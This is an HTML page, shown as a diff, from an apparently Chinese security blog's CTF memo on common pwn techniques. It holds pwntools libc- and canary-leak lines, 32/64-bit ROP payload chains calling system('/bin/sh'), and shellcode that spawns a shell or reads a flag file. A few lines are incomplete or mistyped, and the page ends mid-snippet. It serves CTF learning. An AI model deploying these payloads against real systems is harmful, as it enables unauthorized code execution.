@@ -1,0 +1,830 @@
+<!DOCTYPE html>
+<html lang="en-us">
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    
+    <meta property="og:site_name" content="Mr.Be1ieVe&#39;s Treasure">
+    <meta property="og:type" content="article">
+
+    
+    <meta property="og:image" content="https://mrbelieve.tech/img/home-bg-universe.jpg">
+    <meta property="twitter:image" content="https://mrbelieve.tech/img/home-bg-universe.jpg" />
+    
+
+    
+    <meta name="title" content="Pwn常用指令" />
+    <meta property="og:title" content="Pwn常用指令" />
+    <meta property="twitter:title" content="Pwn常用指令" />
+    
+
+    
+    <meta name="description" content="Mr.Be1ieVe，安全运营, 信息安全，生活家 | 这里是 Mr.Be1ieVe 的博客，与你一同学习进步。">
+    <meta property="og:description" content="Mr.Be1ieVe，安全运营, 信息安全，生活家 | 这里是 Mr.Be1ieVe 的博客，与你一同学习进步。" />
+    <meta property="twitter:description" content="Mr.Be1ieVe，安全运营, 信息安全，生活家 | 这里是 Mr.Be1ieVe 的博客，与你一同学习进步。" />
+    
+
+    
+    <meta property="twitter:card" content="summary" />
+    
+    
+
+    <meta name="keyword"  content="Mr.Be1ieVe">
+    <link rel="shortcut icon" href="/img/favicon.ico">
+
+    <title>Pwn常用指令 | Mr.Be1ieVe的博客 | Mr.Be1ieVe&#39;s Blog</title>
+
+    <link rel="canonical" href="/post/pwn%E5%B8%B8%E7%94%A8%E6%8C%87%E4%BB%A4/">
+
+    
+    
+    
+    <link rel="stylesheet" href="/css/bootstrap.min.css">
+
+    
+    <link rel="stylesheet" href="/css/hugo-theme-cleanwhite.min.css">
+
+    
+    <link rel="stylesheet" href="/css/zanshang.css">
+
+    
+    <link href="https://cdn.jsdelivr.net/gh/FortAwesome/Font-Awesome@5.15.1/css/all.css" rel="stylesheet" type="text/css">
+
+    
+    
+
+    
+    <script src="/js/jquery.min.js"></script>
+
+    
+    <script src="/js/bootstrap.min.js"></script>
+
+    
+    <script src="/js/hux-blog.min.js"></script>
+
+    
+    
+
+</head>
+
+
+
+
+<nav class="navbar navbar-default navbar-custom navbar-fixed-top">
+
+    <div class="container-fluid">
+        
+        <div class="navbar-header page-scroll">
+            <button type="button" class="navbar-toggle">
+                <span class="sr-only">Toggle navigation</span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+            </button>
+            <a class="navbar-brand" href="/">Mr.Be1ieVe&#39;s Treasure</a>
+        </div>
+
+        
+        
+        <div id="huxblog_navbar">
+            <div class="navbar-collapse">
+                <ul class="nav navbar-nav navbar-right">
+                    <li>
+                        <a href="/">All Posts</a>
+                    </li>
+                    
+                        
+                        <li>
+                            <a href="/categories/%E4%B8%AA%E4%BA%BA%E5%8E%9F%E5%88%99%E5%AE%AA%E6%B3%95">个人原则宪法</a>
+                        </li>
+                        
+                        <li>
+                            <a href="/categories/%E5%AE%89%E5%85%A8%E5%BB%BA%E8%AE%BE%E5%AE%9E%E8%B7%B5">安全建设实践</a>
+                        </li>
+                        
+                        <li>
+                            <a href="/categories/%E5%BA%95%E5%B1%82%E5%8E%9F%E7%90%86%E6%80%9D%E8%80%83%E4%B8%8E%E5%88%86%E6%9E%90">底层原理思考与分析</a>
+                        </li>
+                        
+                    
+                    
+		    
+                        <li><a href="/top/archive/">ARCHIVE</a></li>
+                    
+                        <li><a href="/top/about/">ABOUT</a></li>
+                    
+
+                    
+		    <li>
+                        <a href="/search"><i class="fa fa-search"></i></a>
+		    </li>
+                    
+                </ul>
+            </div>
+        </div>
+        
+    </div>
+    
+</nav>
+<script>
+    
+    
+    
+    var $body   = document.body;
+    var $toggle = document.querySelector('.navbar-toggle');
+    var $navbar = document.querySelector('#huxblog_navbar');
+    var $collapse = document.querySelector('.navbar-collapse');
+
+    $toggle.addEventListener('click', handleMagic)
+    function handleMagic(e){
+        if ($navbar.className.indexOf('in') > 0) {
+        
+            $navbar.className = " ";
+            
+            setTimeout(function(){
+                
+                if($navbar.className.indexOf('in') < 0) {
+                    $collapse.style.height = "0px"
+                }
+            },400)
+        }else{
+        
+            $collapse.style.height = "auto"
+            $navbar.className += " in";
+        }
+    }
+</script>
+
+
+
+
+<style type="text/css">
+    header.intro-header {
+        background-image: url('/img/home-bg-universe.jpg')
+    }
+</style>
+
+<header class="intro-header" >
+
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <div class="post-heading">
+                    <div class="tags">
+                        
+                        <a class="tag" href="/tags/" title="[CTF 备忘]">
+                            [CTF 备忘]
+                        </a>
+                        
+                    </div>
+                    <h1>Pwn常用指令</h1>
+                    <h2 class="subheading"></h2>
+                    <span class="meta">
+                        
+                            Posted by 
+                            
+                                    Mr.Be1ieVe&#39;s Treasure
+                             
+                            on 
+                            Wednesday, February 5, 2020
+                            
+                            
+                            
+                            
+                    </span>
+                </div>
+            </div>
+        </div>
+    </div>
+</header>
+
+
+
+
+<article>
+    <div class="container">
+        <div class="row">
+
+            
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                post-container">
+
+                
+                <p><code>ldd filename</code> 读取libc</p>
+<p><code>ROPgadget --binary filename --only &quot;pop|ret&quot;</code></p>
+<p><code>__libc_start_main = u64(sh.recvuntil(&quot;\x7f&quot;)[-6:].ljust(8,'\x00'))</code></p>
+<p><code>__libc_start_main = u32(sh.recvuntil(&quot;\xf7&quot;)[-4:])</code></p>
+<p><code>__libc_start_main = u32(sh.recv(4))</code></p>
+<p><code>canary =  u64(sh.recv(7).rjust(8,&quot;\x00&quot;)) log.success(&quot;canary------&gt;&quot; + hex(canary))</code></p>
+<p>接受成int型地址：<code>str_addr = int(sh.recvuntil(&quot;\n&quot;,True),16)</code></p>
+<p><code>seccomp-tools dump ./filename</code></p>
+<p>找不到flag：<code>grep -rn flag *</code></p>
+<p>32位</p>
+<p>第一个放在rdi 第二个放在rsi 第三个放在rdx</p>
+<p>64位就得</p>
+<h2 id="32位">32位</h2>
+<h3 id="print">print</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span> payload <span style="color:#ff79c6">+=</span> p32(printf_plt)
+</span></span><span style="display:flex;"><span> payload <span style="color:#ff79c6">+=</span> p32(start_vuln)
+</span></span><span style="display:flex;"><span> payload <span style="color:#ff79c6">+=</span> p32(<span style="color:#bd93f9">0x080486F8</span>)
+</span></span><span style="display:flex;"><span> payload <span style="color:#ff79c6">+=</span> p32(elf<span style="color:#ff79c6">.</span>got[<span style="color:#f1fa8c">&#39;__libc_start_main&#39;</span>])
+</span></span></code></pre></div><h3 id="systembinsh">system(&quot;/bin/sh&quot;)</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>payload <span style="color:#ff79c6">+=</span> p32(system)
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff79c6">+=</span> p32(<span style="color:#bd93f9">0</span>)
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff79c6">+=</span> p32(binsh)
+</span></span><span style="display:flex;"><span>sh<span style="color:#ff79c6">.</span>sendline(payload)
+</span></span></code></pre></div><h3 id="write">write</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>payload <span style="color:#ff79c6">+=</span> p32(elf<span style="color:#ff79c6">.</span>plt[<span style="color:#f1fa8c">&#39;write&#39;</span>])
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff79c6">+=</span> p32(pop_esi_edi_ebp_ret)
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff79c6">+=</span> p32(<span style="color:#bd93f9">1</span>)
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff79c6">+=</span> p32(elf<span style="color:#ff79c6">.</span>got[<span style="color:#f1fa8c">&#39;__libc_start_main&#39;</span>])
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff79c6">+=</span> p32(<span style="color:#bd93f9">4</span>)
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff79c6">+=</span> p32(start_main)
+</span></span></code></pre></div><h3 id="read">read</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>payload <span style="color:#ff79c6">+=</span> p32(elf<span style="color:#ff79c6">.</span>plt[<span style="color:#f1fa8c">&#39;read&#39;</span>])
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff79c6">+=</span> p32(pop3_ret)
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff79c6">+=</span> p32(<span style="color:#bd93f9">0</span>) <span style="color:#6272a4">#从哪里读取</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff79c6">+=</span> p32(bss_addr)
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff79c6">+=</span> p32(<span style="color:#bd93f9">0x223</span>) <span style="color:#6272a4">#长度</span>
+</span></span></code></pre></div><h2 id="64">64</h2>
+<ol>
+<li></li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>main_arena <span style="color:#ff79c6">=</span> u64(io<span style="color:#ff79c6">.</span>recv(<span style="color:#bd93f9">6</span>)<span style="color:#ff79c6">.</span>ljust(<span style="color:#bd93f9">8</span>,<span style="color:#f1fa8c">&#39;</span><span style="color:#f1fa8c">\x00</span><span style="color:#f1fa8c">&#39;</span>))<span style="color:#ff79c6">-</span><span style="color:#bd93f9">88</span>
+</span></span><span style="display:flex;"><span>log<span style="color:#ff79c6">.</span>success(<span style="color:#f1fa8c">&#39;main arena: &#39;</span><span style="color:#ff79c6">+</span><span style="color:#8be9fd;font-style:italic">hex</span>(main_arena))
+</span></span><span style="display:flex;"><span>libc_base <span style="color:#ff79c6">=</span> main_arena <span style="color:#ff79c6">-</span> <span style="color:#bd93f9">0x3c4b20</span>
+</span></span><span style="display:flex;"><span>log<span style="color:#ff79c6">.</span>success(<span style="color:#f1fa8c">&#39;libc base: &#39;</span><span style="color:#ff79c6">+</span><span style="color:#8be9fd;font-style:italic">hex</span>(libc_base))<span style="color:#bd93f9">2.</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>libc_base <span style="color:#ff79c6">=</span> u64(sh<span style="color:#ff79c6">.</span>recv(<span style="color:#bd93f9">8</span>)) <span style="color:#ff79c6">-</span> <span style="color:#bd93f9">0x3C4B78</span>
+</span></span><span style="display:flex;"><span>malloc_hook <span style="color:#ff79c6">=</span> libc_base <span style="color:#ff79c6">+</span> libc<span style="color:#ff79c6">.</span>symbols[<span style="color:#f1fa8c">&#39;__malloc_hook&#39;</span>]
+</span></span><span style="display:flex;"><span>log<span style="color:#ff79c6">.</span>success(<span style="color:#f1fa8c">&#34;libc_base: &#34;</span> <span style="color:#ff79c6">+</span> <span style="color:#8be9fd;font-style:italic">hex</span>(libc_base))
+</span></span><span style="display:flex;"><span>log<span style="color:#ff79c6">.</span>success(<span style="color:#f1fa8c">&#34;__malloc_hook: &#34;</span> <span style="color:#ff79c6">+</span> <span style="color:#8be9fd;font-style:italic">hex</span>(malloc_hook))
+</span></span></code></pre></div><h3 id="system">system</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>payload <span style="color:#ff79c6">+=</span> p64(pop_rdi_ret)
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff79c6">+=</span> p64(binsh)
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff79c6">+=</span> p64(system)
+</span></span><span style="display:flex;"><span>sh<span style="color:#ff79c6">.</span>sendline(payload)
+</span></span></code></pre></div><h3 id="printf">printf</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>payload <span style="color:#ff79c6">+=</span> p64(pop_rdi_ret)
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff79c6">+=</span> p64(elf<span style="color:#ff79c6">.</span>got[<span style="color:#f1fa8c">&#39;__libc_start_main&#39;</span>])
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff79c6">+=</span> p64(elf<span style="color:#ff79c6">.</span>plt[<span style="color:#f1fa8c">&#39;printf&#39;</span>])
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff79c6">+=</span> p64(start_main)
+</span></span></code></pre></div><h3 id="write-1">write</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>payload <span style="color:#ff79c6">+=</span> p64(pop_rdi_ret)
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff79c6">+=</span> p64(<span style="color:#bd93f9">1</span>)
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff79c6">+=</span> p64(pop_rsi_r15_ret)
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff79c6">+=</span> p64(elf<span style="color:#ff79c6">.</span>got[<span style="color:#f1fa8c">&#39;__libc_start_main&#39;</span>])
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff79c6">+=</span> p64(<span style="color:#bd93f9">1</span>)
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff79c6">+=</span> p64(elf<span style="color:#ff79c6">.</span>plt[<span style="color:#f1fa8c">&#39;write&#39;</span>])
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff79c6">+=</span> p64(start_main)
+</span></span></code></pre></div><h2 id="32">32</h2>
+<h3 id="read-1">read</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>payload <span style="color:#ff79c6">=</span>p32(elf<span style="color:#ff79c6">.</span>plt[<span style="color:#f1fa8c">&#39;read&#39;</span>]) 
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff79c6">+=</span> p32(pop3_ret) 
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff79c6">+=</span> p32(<span style="color:#bd93f9">0</span>) 
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff79c6">+=</span> p32(base)
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff79c6">+=</span> p32(<span style="color:#bd93f9">0x500</span>)
+</span></span></code></pre></div><h3 id="write-2">write</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>payload <span style="color:#ff79c6">+=</span> p32(elf<span style="color:#ff79c6">.</span>plt[<span style="color:#f1fa8c">&#39;write&#39;</span>])
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff79c6">+=</span> p32(pop3_ret)
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff79c6">+=</span> p32(<span style="color:#bd93f9">1</span>)
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff79c6">+=</span> p32(elf<span style="color:#ff79c6">.</span>got[<span style="color:#f1fa8c">&#39;__libc_start_main&#39;</span>])
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff79c6">+=</span> p32(<span style="color:#bd93f9">4</span>)
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff79c6">+=</span> p32(start_main)
+</span></span></code></pre></div><h2 id="64-1">64</h2>
+<h3 id="puts">puts</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>payload <span style="color:#ff79c6">+=</span> p64(pop_rdi_ret)
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff79c6">+=</span> p64(elf<span style="color:#ff79c6">.</span>got[<span style="color:#f1fa8c">&#39;__libc_start_main&#39;</span>])
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff79c6">+=</span> p64(elf<span style="color:#ff79c6">.</span>plt[<span style="color:#f1fa8c">&#39;puts&#39;</span>])
+</span></span></code></pre></div><h3 id="systembinsh-1">system(&quot;/bin/sh&quot;)</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>payload <span style="color:#ff79c6">+=</span> p64(pop_rdi_ret)
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff79c6">+=</span> p64(binsh)
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff79c6">+=</span> p64(system)
+</span></span><span style="display:flex;"><span>sh<span style="color:#ff79c6">.</span>sendline(payload)
+</span></span></code></pre></div><h3 id="read-2">read</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>payload <span style="color:#ff79c6">+=</span> p64(pop_rsi_ret)
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff79c6">+=</span> p64(elf<span style="color:#ff79c6">.</span>bss()) 
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff79c6">+=</span> p64(elf<span style="color:#ff79c6">.</span>plt[<span style="color:#f1fa8c">&#39;read&#39;</span>])
+</span></span></code></pre></div><h3 id="open">open</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>payload <span style="color:#ff79c6">+=</span> p64(pop_rdi_ret)
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff79c6">+=</span> p64(elf<span style="color:#ff79c6">.</span>bss()<span style="color:#ff79c6">+</span><span style="color:#bd93f9">0x100</span>)
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff79c6">+=</span> p64(pop_rsi_ret)
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff79c6">+=</span> p64(<span style="color:#bd93f9">0</span>)
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff79c6">+=</span> p64(elf<span style="color:#ff79c6">.</span>plt[<span style="color:#f1fa8c">&#39;open&#39;</span>])
+</span></span></code></pre></div><h3 id="open_read_put">open_read_put</h3>
+<p>
+  <img src="/img/Pwn%e5%b8%b8%e7%94%a8%e6%8c%87%e4%bb%a4/image-20200128101042088.png" alt="image-20200128101042088">
+
+</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>    payload <span style="color:#ff79c6">+=</span> p64(pop_rsi_ret)
+</span></span><span style="display:flex;"><span>    payload <span style="color:#ff79c6">+=</span> p64(elf<span style="color:#ff79c6">.</span>bss()<span style="color:#ff79c6">+</span><span style="color:#bd93f9">0x100</span>)
+</span></span><span style="display:flex;"><span>    payload <span style="color:#ff79c6">+=</span> p64(elf<span style="color:#ff79c6">.</span>plt[<span style="color:#f1fa8c">&#39;read&#39;</span>])
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    payload <span style="color:#ff79c6">+=</span> p64(pop_rdi_ret)
+</span></span><span style="display:flex;"><span>    payload <span style="color:#ff79c6">+=</span> p64(elf<span style="color:#ff79c6">.</span>bss()<span style="color:#ff79c6">+</span><span style="color:#bd93f9">0x100</span>)
+</span></span><span style="display:flex;"><span>    payload <span style="color:#ff79c6">+=</span> p64(pop_rsi_ret)
+</span></span><span style="display:flex;"><span>    payload <span style="color:#ff79c6">+=</span> p64(<span style="color:#bd93f9">0</span>)
+</span></span><span style="display:flex;"><span>    payload <span style="color:#ff79c6">+=</span> p64(elf<span style="color:#ff79c6">.</span>plt[<span style="color:#f1fa8c">&#39;open&#39;</span>])
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    payload <span style="color:#ff79c6">+=</span> p64(pop_rdi_ret)
+</span></span><span style="display:flex;"><span>    payload <span style="color:#ff79c6">+=</span> p64(<span style="color:#bd93f9">4</span>)<span style="color:#6272a4">#?</span>
+</span></span><span style="display:flex;"><span>    payload <span style="color:#ff79c6">+=</span> p64(pop_rsi_ret)
+</span></span><span style="display:flex;"><span>    payload <span style="color:#ff79c6">+=</span> p64(elf<span style="color:#ff79c6">.</span>bss()<span style="color:#ff79c6">+</span><span style="color:#bd93f9">0x100</span>)
+</span></span><span style="display:flex;"><span>    payload <span style="color:#ff79c6">+=</span> p64(elf<span style="color:#ff79c6">.</span>plt[<span style="color:#f1fa8c">&#39;read&#39;</span>])
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    payload <span style="color:#ff79c6">+=</span> p64(pop_rdi_ret)
+</span></span><span style="display:flex;"><span>    payload <span style="color:#ff79c6">+=</span> p64(elf<span style="color:#ff79c6">.</span>bss()<span style="color:#ff79c6">+</span><span style="color:#bd93f9">0x100</span>)
+</span></span><span style="display:flex;"><span>    payload <span style="color:#ff79c6">+=</span> p64(elf<span style="color:#ff79c6">.</span>plt[<span style="color:#f1fa8c">&#39;puts&#39;</span>])
+</span></span></code></pre></div><h2 id="i386">i386</h2>
+<p>可参考http://mrbelieve.tech/2020/01/24/ciscn_2019_s_9/</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>shellcode <span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#39;&#39;&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">xor    eax,eax
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">push   eax
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">push   0x68732f2f #//sh
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">push   0x6e69622f # /bin
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">mov    ebx,esp
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">mov    ecx,eax
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">mov    edx,eax
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">mov    al,0xb
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">int    0x80
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">xor    eax,eax
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">inc    eax
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">int    0x80
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">&#39;&#39;&#39;</span>
+</span></span><span style="display:flex;"><span>shellcode <span style="color:#ff79c6">=</span>asm(shellcode) <span style="color:#6272a4">#使用shellcraft.sh打不通，估计是因为太长了</span>
+</span></span><span style="display:flex;"><span>shell<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;sub esp,0x28;call esp&#34;</span>
+</span></span><span style="display:flex;"><span>shell <span style="color:#ff79c6">=</span>asm(shell)
+</span></span></code></pre></div><h2 id="amd64">amd64</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>push <span style="color:#bd93f9">0x67616c66</span>
+</span></span><span style="display:flex;"><span>mov rdi,rsp 
+</span></span><span style="display:flex;"><span>push <span style="color:#bd93f9">2</span>
+</span></span><span style="display:flex;"><span>pop rax
+</span></span><span style="display:flex;"><span>xor rsi,rsi
+</span></span><span style="display:flex;"><span>push <span style="color:#bd93f9">32</span>
+</span></span><span style="display:flex;"><span>pop rdx
+</span></span><span style="display:flex;"><span>syscall
+</span></span><span style="display:flex;"><span>mov rdi,rax
+</span></span><span style="display:flex;"><span>mov rsi,rsp
+</span></span><span style="display:flex;"><span>xor rax,rax
+</span></span><span style="display:flex;"><span>syscall
+</span></span><span style="display:flex;"><span>push <span style="color:#bd93f9">1</span>
+</span></span><span style="display:flex;"><span>pop rdi
+</span></span><span style="display:flex;"><span>push <span style="color:#bd93f9">1</span>
+</span></span><span style="display:flex;"><span>pop rax
+</span></span><span style="display:flex;"><span>syscall
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>push   <span style="color:#bd93f9">0x42</span>
+</span></span><span style="display:flex;"><span>pop    rax
+</span></span><span style="display:flex;"><span>inc    ah
+</span></span><span style="display:flex;"><span>cqo
+</span></span><span style="display:flex;"><span>push   rdx
+</span></span><span style="display:flex;"><span>movabs rdi, <span style="color:#bd93f9">0x68732f2f6e69622f</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>push   rdi
+</span></span><span style="display:flex;"><span>push   rsp
+</span></span><span style="display:flex;"><span>pop    rsi
+</span></span><span style="display:flex;"><span>mov    r8, rdx
+</span></span><span style="display:flex;"><span>mov    r10, rdx
+</span></span><span style="display:flex;"><span>syscal
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>xor    <span style="color:#ff79c6">%</span>rsi,<span style="color:#ff79c6">%</span>rsi
+</span></span><span style="display:flex;"><span>push   <span style="color:#ff79c6">%</span>rsi
+</span></span><span style="display:flex;"><span>mov $<span style="color:#bd93f9">0x68732f2f6e69622f</span>,<span style="color:#ff79c6">%</span>rdi
+</span></span><span style="display:flex;"><span>push   <span style="color:#ff79c6">%</span>rdi
+</span></span><span style="display:flex;"><span>push   <span style="color:#ff79c6">%</span>rsp
+</span></span><span style="display:flex;"><span>pop    <span style="color:#ff79c6">%</span>rdi
+</span></span><span style="display:flex;"><span>push  $<span style="color:#bd93f9">0x3b</span>
+</span></span><span style="display:flex;"><span>pop    <span style="color:#ff79c6">%</span>rax
+</span></span><span style="display:flex;"><span>cltd   
+</span></span><span style="display:flex;"><span>syscall 
+</span></span></code></pre></div><h2 id="mmap">mmap</h2>
+<p><code>void *mmap(void *start,size_t length,int prot,int flags,int fd,off_t offsize);</code></p>
+<blockquote>
+<p>参数start：指向欲映射的内存起始地址，通常设为 NULL，代表让系统自动选定地址，映射成功后返回该地址。</p>
+<p>参数length：代表将文件中多大的部分映射到内存。</p>
+<p>参数prot：映射区域的保护方式。可以为以下几种方式的组合：
+PROT_EXEC       映射区域可被执行
+PROT_READ       映射区域可被读取
+PROT_WRITE     映射区域可被写入
+PROT_NONE      映射区域不能存取</p>
+<p>参数flags：影响映射区域的各种特性。在调用mmap()时必须要指定MAP_SHARED 或MAP_PRIVATE。
+MAP_FIXED                如果参数start所指的地址无法成功建立映射时，则放弃映射，不对地址做修正。通常不鼓励用此旗标。
+MAP_SHARED          对映射区域的写入数据会复制回文件内，而且允许其他映射该文件的进程共享。
+MAP_PRIVATE            对映射区域的写入操作会产生一个映射文件的复制，即私人的“写入时复制”（copy on write）对此区域作的任何修改都不会写回原来的文件内容。
+MAP_ANONYMOUS  建立匿名映射。此时会忽略参数fd，不涉及文件，而且映射区域无法和其他进程共享。
+MAP_DENYWRITE   只允许对映射区域的写入操作，其他对文件直接写入的操作将会被拒绝。
+MAP_LOCKED          将映射区域锁定住，这表示该区域不会被置换（swap）。</p>
+<p>参数fd：要映射到内存中的文件描述符。如果使用匿名内存映射时，即flags中设置了MAP_ANONYMOUS，fd设为-1。有些系统不支持匿名内存映射，则可以使用fopen打开/dev/zero文件，然后对该文件进行映射，可以同样达到匿名内存映射的效果。</p>
+<p>参数offset：文件映射的偏移量，通常设置为0，代表从文件最前方开始对应，offset必须是分页大小的整数倍。
+————————————————
+版权声明：本文为CSDN博主「为幸福写歌」的原创文章，遵循 CC 4.0 BY-SA 版权协议，转载请附上原文出处链接及本声明。
+原文链接：https://blog.csdn.net/yzy1103203312/article/details/78286360</p>
+</blockquote>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#ff79c6">from</span> struct <span style="color:#ff79c6">import</span> pack 
+</span></span><span style="display:flex;"><span>p <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">lambda</span> x : pack(<span style="color:#f1fa8c">&#39;I&#39;</span>, x)
+</span></span><span style="display:flex;"><span>IMAGE_BASE_0 <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x08048000</span> <span style="color:#6272a4"># ./simplerop</span>
